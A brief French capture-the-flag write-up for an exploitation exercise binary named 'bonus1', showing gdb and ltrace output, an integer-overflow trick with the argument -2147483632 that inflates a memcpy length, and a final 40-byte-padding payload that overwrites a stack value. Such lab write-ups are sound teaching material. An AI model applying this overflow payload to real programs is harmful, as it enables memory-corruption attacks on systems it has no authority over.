ltrace ./bonus1 9 FLOW

atoi(0xbffff83e, 0x8049764, 3, 0x80482fd, 0xb7fd13e4) = 9
memcpy(0xbffff624, "FLOW", 36)                   = 0xbffff624

(gdb) set args "9" "FLOW"

x/x 0xbffff5f0
0xbffff5f0:     0xbffff604

0xbffff604

(gdb) x/x $esp+0x3c
0xbffff62c:     0x00000009

set args "-12" $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A"')

(gdb) x/32wx 0xbffff414
0xbffff414:     0x41306141      0x61413161      0x33614132      0x41346141
0xbffff424:     0x61413561      0x37614136      0x41386141      0x62413961
0xbffff434:     0x31624130      0x080484b9      0x00000009

En donnant 9 a memcpy on observe que nous n'avons toujours pas assez d'espace copier pour ecraser le retour de atoi pour y mettre 0x574f4c46

Il va falloir overflow l'int qui, apres une multiplication par 4 (decalage de 2bits a gauche) soit positif, assez grand pour overflow esp+0x3c

Sachant que le bit de signe est le dernier bit on sait qu'on va devoir etre proche de la max valeur negative de l'int 

1000 0000 0000 0000 0000 0000 0000 0011 << 2
= 0000 0000 0000 0000 0000 0000 0000 1100

-2147483632

"-2147483632" "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A"

Breakpoint 1, 0x08048478 in main ()
(gdb) x/x $esp+0x3c
0xbffff5ec:     0x62413362

Avec le buffer overflow pattern generator, j'obtien un offset de 40
On va pouvoir write 0x574f4c46 apres un padding de 40 bytes

set args "-2147483632" $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')